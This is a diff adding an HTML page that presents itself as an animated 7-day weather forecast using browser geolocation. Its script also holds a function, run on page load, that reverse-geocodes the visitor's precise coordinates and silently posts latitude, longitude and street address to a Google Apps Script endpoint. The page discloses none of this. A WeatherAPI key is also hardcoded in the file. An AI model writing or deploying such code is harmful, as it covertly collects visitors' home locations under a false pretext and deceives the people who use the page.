@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>7-Day Weather Forecast (Animated, Live Data)</title>
+<style>
+  /* === BODY & THEME === */
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(to top, #74ebd5, #ACB6E5);
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding: 2rem;
+    transition: background 1s ease;
+    overflow-x: hidden;
+  }
+  body.night {
+    background: linear-gradient(to top, #2c3e50, #4ca1af);
+    color: #ddd;
+  }
+
+  h1 {
+    text-align: center;
+    margin-bottom: 1rem;
+    user-select: none;
+  }
+
+  #location-msg {
+    font-size: 1.1em;
+    margin-bottom: 2rem;
+    user-select: none;
+  }
+
+  #error-msg {
+    color: #b00;
+    margin-top: 1rem;
+    user-select: none;
+  }
+
+  /* === FORECAST GRID === */
+  .forecast-container {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 1rem;
+    width: 100%;
+    max-width: 1100px;
+  }
+
+  /* === CARD BASE === */
+  .day-card {
+    perspective: 1000px;
+    position: relative;       /* Fix overlapping */
+    height: 320px;            /* Fixed height */
+  }
+
+  .card-inner {
+    position: relative;       /* Changed from absolute */
+    width: 100%;
+    height: 100%;
+    background: #fff;
+    border-radius: 16px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    padding: 1rem;
+    text-align: center;
+    cursor: pointer;
+    transition: transform 0.6s;
+    transform-style: preserve-3d;
+  }
+  body.night .card-inner {
+    background: #2c3e50;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+  }
+
+  .day-card:hover .card-inner,
+  .day-card:focus-within .card-inner {
+    transform: rotateY(180deg);
+  }
+
+  /* === CARD FRONT & BACK === */
+  .card-front, .card-back {
+    position: absolute;
+    width: 100%;
+    height: 100%;             /* Fill parent height */
+    backface-visibility: hidden;
+    border-radius: 16px;
+    left: 0; top: 0;
+    box-sizing: border-box;
+    padding: 1rem;
+  }
+  .card-front {
+    /* front side styles */
+  }
+  .card-back {
+    background: #f4f4f4;
+    transform: rotateY(180deg);
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: flex-start;
+    font-size: 1em;
+    line-height: 1.5;
+    gap: 12px;
+  }
+  body.night .card-back {
+    background: #3a4a5a;
+    color: #ddd;
+  }
+
+  /* Label styling on back */
+  .card-back .info-label {
+    font-weight: 600;
+    color: #555;
+    min-width: 90px;
+    display: inline-block;
+  }
+  body.night .card-back .info-label {
+    color: #aaa;
+  }
+
+  .card-back .info-row {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 8px;
+    border-bottom: 1px solid #ddd;
+    padding-bottom: 6px;
+  }
+  body.night .card-back .info-row {
+    border-color: #555;
+  }
+  .card-back .info-row:last-child {
+    border-bottom: none;
+    padding-bottom: 0;
+  }
+
+  .card-back .info-value {
+    font-weight: 500;
+    color: #222;
+  }
+  body.night .card-back .info-value {
+    color: #eee;
+  }
+
+  /* === DAY NAME === */
+  .day-name {
+    font-weight: 700;
+    font-size: 1.2em;
+  }
+
+  /* === WEATHER ICONS & Animations === */
+
+  /* Sun blinking */
+  @keyframes sunBlink {
+    0%,100% {opacity:1;}
+    50% {opacity:0.5;}
+  }
+  .icon-sunny {
+    animation: sunBlink 2s infinite;
+  }
+
+  /* Clouds drifting */
+  @keyframes cloudDrift {
+    0%, 100% { transform: translateX(0); }
+    50% { transform: translateX(5px); }
+  }
+  .icon-cloudy {
+    animation: cloudDrift 4s ease-in-out infinite;
+  }
+
+  /* Raindrops falling */
+  .rain-container {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    margin: 0 auto 10px;
+  }
+  .icon-rainy {
+    width: 60px;
+    height: 60px;
+    display: block;
+  }
+  .raindrop {
+    position: absolute;
+    bottom: 10px;
+    width: 4px;
+    height: 12px;
+    background: #00aaff;
+    border-radius: 2px;
+    animation: fall 1s linear infinite;
+    opacity: 0.6;
+  }
+  .raindrop:nth-child(1) { left: 15px; animation-delay: 0s; }
+  .raindrop:nth-child(2) { left: 30px; animation-delay: 0.3s; }
+  .raindrop:nth-child(3) { left: 45px; animation-delay: 0.6s; }
+  @keyframes fall {
+    0% { transform: translateY(0); opacity: 0.6; }
+    80% { opacity: 1; }
+    100% { transform: translateY(20px); opacity: 0; }
+  }
+
+  /* Snowfall */
+  .snow-container {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    margin: 0 auto 10px;
+  }
+  .icon-snowy {
+    width: 60px;
+    height: 60px;
+    display: block;
+  }
+  .snowflake {
+    position: absolute;
+    background: #fff;
+    border-radius: 50%;
+    opacity: 0.8;
+    width: 6px;
+    height: 6px;
+    animation: snowFall 5s linear infinite;
+  }
+  .snowflake:nth-child(1) { left: 10px; animation-delay: 0s; animation-duration: 4s;}
+  .snowflake:nth-child(2) { left: 30px; animation-delay: 1.5s; animation-duration: 5s;}
+  .snowflake:nth-child(3) { left: 50px; animation-delay: 3s; animation-duration: 6s;}
+  @keyframes snowFall {
+    0% { transform: translateY(0); opacity: 0.8;}
+    100% { transform: translateY(40px); opacity: 0;}
+  }
+
+  /* Lightning flash */
+  .lightning-flash {
+    position: absolute;
+    top: 5px; left: 50%;
+    width: 80px;
+    height: 80px;
+    background: rgba(255, 255, 255, 0.7);
+    filter: drop-shadow(0 0 10px #fff);
+    opacity: 0;
+    transform: translateX(-50%);
+    animation: flash 1.5s infinite;
+    border-radius: 12px;
+    pointer-events: none;
+    z-index: 1;
+  }
+  @keyframes flash {
+    0%, 90%, 100% {opacity: 0;}
+    92%, 95% {opacity: 0.8;}
+  }
+
+  /* Wind swirl */
+  .wind-container {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    margin: 0 auto 10px;
+  }
+  .wind-line {
+    position: absolute;
+    border: 3px solid #ccc;
+    border-radius: 50%;
+    border-top-color: transparent;
+    border-right-color: transparent;
+    width: 35px;
+    height: 35px;
+    top: 12px;
+    left: 12px;
+    animation: spin 2s linear infinite;
+  }
+  .wind-line.small {
+    width: 20px;
+    height: 20px;
+    top: 22px;
+    left: 22px;
+    animation-duration: 3s;
+  }
+  @keyframes spin {
+    0% {transform: rotate(0);}
+    100% {transform: rotate(360deg);}
+  }
+
+  /* Temperature bar */
+  .temp-bar-container {
+    background: #eee;
+    border-radius: 10px;
+    height: 10px;
+    margin: 8px 0 12px 0;
+    overflow: hidden;
+  }
+  body.night .temp-bar-container {
+    background: #555;
+  }
+  .temp-bar {
+    height: 10px;
+    background: linear-gradient(90deg, #ff9800, #f44336);
+    border-radius: 10px;
+    transition: width 0.5s ease;
+  }
+
+  /* Humidity & wind info */
+  .info-row-front {
+    display: flex;
+    justify-content: space-around;
+    font-size: 0.9em;
+    margin-top: 6px;
+    user-select: none;
+  }
+  .info-item {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .info-item svg {
+    width: 16px;
+    height: 16px;
+    fill: #666;
+  }
+  body.night .info-item svg {
+    fill: #bbb;
+  }
+
+  /* Background clouds */
+  .background-clouds {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+  .cloud {
+    position: absolute;
+    background: #fff;
+    background: radial-gradient(ellipse at center, #fff 0%, #cce7ff 80%);
+    border-radius: 50%;
+    opacity: 0.3;
+    filter: blur(8px);
+    animation: cloudDriftBG linear infinite;
+  }
+  .cloud1 {
+    width: 150px; height: 90px;
+    top: 10%;
+    left: -200px;
+    animation-duration: 90s;
+  }
+  .cloud2 {
+    width: 220px; height: 130px;
+    top: 30%;
+    left: -300px;
+    animation-duration: 70s;
+  }
+  .cloud3 {
+    width: 120px; height: 80px;
+    top: 50%;
+    left: -180px;
+    animation-duration: 80s;
+  }
+  @keyframes cloudDriftBG {
+    0% {transform: translateX(0);}
+    100% {transform: translateX(130vw);}
+  }
+  /* Responsive grid for different screen sizes */
+.forecast-container {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap: 1rem;
+  width: 100%;
+  max-width: 1100px;
+  margin: 0 auto;
+}
+
+/* Mobile first adjustments */
+@media (max-width: 480px) {
+  .forecast-container {
+    grid-template-columns: 1fr;  /* one column on small phones */
+  }
+  .day-card {
+    height: 280px; /* fixed height for flip cards */
+    max-width: 320px;
+    margin: 0 auto;
+  }
+  .card-inner {
+    padding: 0.8rem;
+  }
+  .day-name {
+    font-size: 1.1em;
+  }
+  .card-back .info-label {
+    min-width: 80px;
+    font-size: 0.9em;
+  }
+  .card-back .info-value {
+    font-size: 0.9em;
+  }
+  .icon,
+  .icon-rainy,
+  .icon-snowy,
+  .rain-container,
+  .snow-container,
+  .wind-container {
+    width: 50px !important;
+    height: 50px !important;
+    margin-bottom: 8px;
+  }
+}
+
+/* Tablets and larger phones */
+@media (min-width: 481px) and (max-width: 800px) {
+  .forecast-container {
+    grid-template-columns: repeat(2, 1fr); /* two columns */
+  }
+  .day-card {
+    height: 300px;
+    max-width: none;
+  }
+  .card-inner {
+    padding: 1rem;
+  }
+  .day-name {
+    font-size: 1.2em;
+  }
+  .card-back .info-label {
+    min-width: 90px;
+    font-size: 1em;
+  }
+  .card-back .info-value {
+    font-size: 1em;
+  }
+  .icon,
+  .icon-rainy,
+  .icon-snowy,
+  .rain-container,
+  .snow-container,
+  .wind-container {
+    width: 60px !important;
+    height: 60px !important;
+    margin-bottom: 10px;
+  }
+}
+</style>
+</head>
+<body>
+
+<h1>7-Day Weather Forecast</h1>
+<div id="location-msg">Please allow location access to get your weather</div>
+<div id="error-msg" role="alert" aria-live="assertive"></div>
+<div class="forecast-container" id="forecast"></div>
+
+<div class="background-clouds" aria-hidden="true">
+  <div class="cloud cloud1"></div>
+  <div class="cloud cloud2"></div>
+  <div class="cloud cloud3"></div>
+</div>
+
+<script>
+const API_KEY = 'e9a5764999114b74bc124459250907';  // Your WeatherAPI.com key
+
+const humiditySVG = `<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C12 2 7 9 7 13a5 5 0 1 0 10 0c0-4-5-11-5-11z"/></svg>`;
+const windSVG = `<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 12h12M4 16h8M4 8h10"/></svg>`;
+
+function getDayName(dateStr) {
+  const date = new Date(dateStr);
+  return date.toLocaleDateString("en-US", { weekday: 'long' });
+}
+
+function createRainDrops() {
+  return `
+    <div class="rain-container" aria-label="rain animation">
+      <img class="icon-rainy" src="https://openweathermap.org/img/wn/10d@2x.png" alt="rainy" />
+      <div class="raindrop"></div>
+      <div class="raindrop"></div>
+      <div class="raindrop"></div>
+    </div>
+  `;
+}
+
+function createSnowfall() {
+  return `
+    <div class="snow-container" aria-label="snow animation">
+      <img class="icon-snowy" src="https://openweathermap.org/img/wn/13d@2x.png" alt="snow" />
+      <div class="snowflake"></div>
+      <div class="snowflake"></div>
+      <div class="snowflake"></div>
+    </div>
+  `;
+}
+
+function createLightning() {
+  return `<div class="lightning-flash" aria-hidden="true"></div>`;
+}
+
+function createWind() {
+  return `
+    <div class="wind-container" aria-label="wind animation">
+      <div class="wind-line"></div>
+      <div class="wind-line small"></div>
+    </div>
+  `;
+}
+
+function getTempBarWidth(tempC) {
+  const minTemp = -10;
+  const maxTemp = 40;
+  let percent = ((tempC - minTemp) / (maxTemp - minTemp)) * 100;
+  return Math.min(Math.max(percent, 0), 100);
+}
+
+function renderForecast(data) {
+  const forecastDiv = document.getElementById("forecast");
+  const locationMsg = document.getElementById("location-msg");
+  const dailyData = data.forecast.forecastday;
+
+  // Day/night toggle by local time (simple check)
+  const now = new Date();
+  if (now.getHours() < 6 || now.getHours() > 18) {
+    document.body.classList.add('night');
+  } else {
+    document.body.classList.remove('night');
+  }
+
+  locationMsg.textContent = `Weather forecast for ${data.location.name}, ${data.location.region || data.location.country}`;
+
+  forecastDiv.innerHTML = dailyData.map(day => {
+    const main = day.day.condition.text.toLowerCase();
+    // Fix icon URL: prepend domain only if needed
+    const iconPath = day.day.condition.icon;
+    const iconUrl = iconPath.startsWith('http') ? iconPath : "https://cdn.weatherapi.com" + iconPath;
+
+    let weatherHTML = "";
+    let sunnyText = day.day.condition.text;
+
+    if (main.includes("clear") || main.includes("sunny")) {
+      weatherHTML = `<img class="icon icon-sunny" src="https://cdn.weatherapi.com/weather/64x64/day/113.png" alt="sunny" />`;
+      sunnyText = "☀️ Sunny";
+    } else if (main.includes("rain") || main.includes("drizzle")) {
+      weatherHTML = createRainDrops();
+      sunnyText = "🌧️ Rainy";
+    } else if (main.includes("thunder")) {
+      weatherHTML = createRainDrops() + createLightning();
+      sunnyText = "⛈️ Thunderstorm";
+    } else if (main.includes("overcast")) {
+      weatherHTML = `<img class="icon icon-cloudy" src="https://cdn.weatherapi.com/weather/64x64/day/116.png" alt="overcast" />`;
+      sunnyText = "☁️ Overcast";
+    } else if (main.includes("cloud")) {
+      weatherHTML = `<img class="icon icon-cloudy" src="https://cdn.weatherapi.com/weather/64x64/day/122.png" alt="cloudy" />`;
+      sunnyText = "☁️ Cloudy";
+    } else if (main.includes("snow")) {
+      weatherHTML = createSnowfall();
+      sunnyText = "❄️ Snow";
+    } else if (main.includes("wind")) {
+      weatherHTML = createWind();
+      sunnyText = "🌬️ Windy";
+    } else {
+      weatherHTML = `<img class="icon" src="${iconUrl}" alt="${day.day.condition.text}" />`;
+    }
+
+    const tempBarWidth = getTempBarWidth(day.day.maxtemp_c);
+
+    return `
+      <div class="day-card" tabindex="0" aria-label="Weather forecast for ${getDayName(day.date)}">
+        <div class="card-inner">
+          <div class="card-front">
+            <div class="day-name">${getDayName(day.date)}</div>
+            ${weatherHTML}
+            <div>${Math.round(day.day.maxtemp_c)}°C / ${Math.round(day.day.mintemp_c)}°C</div>
+            <div class="temp-bar-container" aria-hidden="true">
+              <div class="temp-bar" style="width: ${tempBarWidth}%;"></div>
+            </div>
+            <div class="condition">${day.day.condition.text}</div>
+            <div>${sunnyText}</div>
+            <div class="info-row-front" aria-hidden="true">
+              <div class="info-item" title="Humidity">${humiditySVG} ${day.day.avghumidity}%</div>
+              <div class="info-item" title="Wind speed">${windSVG} ${Math.round(day.day.maxwind_kph / 3.6)} m/s</div>
+            </div>
+          </div>
+          <div class="card-back">
+            <div class="info-row"><span class="info-label">Sunrise:</span><span class="info-value">${day.astro.sunrise}</span></div>
+            <div class="info-row"><span class="info-label">Sunset:</span><span class="info-value">${day.astro.sunset}</span></div>
+            <div class="info-row"><span class="info-label">Humidity:</span><span class="info-value">${day.day.avghumidity}%</span></div>
+            <div class="info-row"><span class="info-label">Wind Speed:</span><span class="info-value">${Math.round(day.day.maxwind_kph / 3.6)} m/s</span></div>
+            <div class="info-row"><span class="info-label">Condition:</span><span class="info-value">${day.day.condition.text}</span></div>
+          </div>
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function showError(message) {
+  const locationMsg = document.getElementById("location-msg");
+  locationMsg.textContent = message;
+}
+
+function sendLocationToGoogleApps(lat, lon) {
+  // Reverse geocode with OpenStreetMap to get address
+  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+    .then(res => res.json())
+    .then(data => {
+      const address = data.display_name || "Address not found";
+
+      // Send location + address to Google Apps Script
+      fetch('https://script.google.com/macros/s/AKfycbxxNyGyhooeofr9ZlRQEu90bolM3UfzfkxKENBzyXvHALV3d0lTA_HP0MIJMZO2F5QvPw/exec', {
+        method: 'POST',
+        mode: 'no-cors',  // avoid CORS issues
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          address: address
+        })
+      }).catch(err => console.error('Failed to send location:', err));
+    })
+    .catch(err => console.error('Failed to reverse geocode:', err));
+}
+
+function fetchWeather(lat, lon) {
+  const url = `https://api.weatherapi.com/v1/forecast.json?key=${API_KEY}&q=${lat},${lon}&days=7&aqi=no&alerts=no`;
+
+  fetch(url)
+    .then(res => {
+      if (!res.ok) throw new Error(`Error fetching weather data (${res.status})`);
+      return res.json();
+    })
+    .then(data => {
+      renderForecast(data);
+    })
+    .catch(err => {
+      showError(err.message);
+    });
+}
+
+function requestLocationAndFetch() {
+  if (!navigator.geolocation) {
+    showError("Geolocation is not supported by your browser.");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      sendLocationToGoogleApps(lat, lon);
+      fetchWeather(lat, lon);
+    },
+    err => {
+      showError("Location permission denied or unavailable. Cannot fetch weather.");
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+}
+
+window.onload = () => {
+  requestLocationAndFetch();
+};
+
+</script>
+
+</body>
+</html>
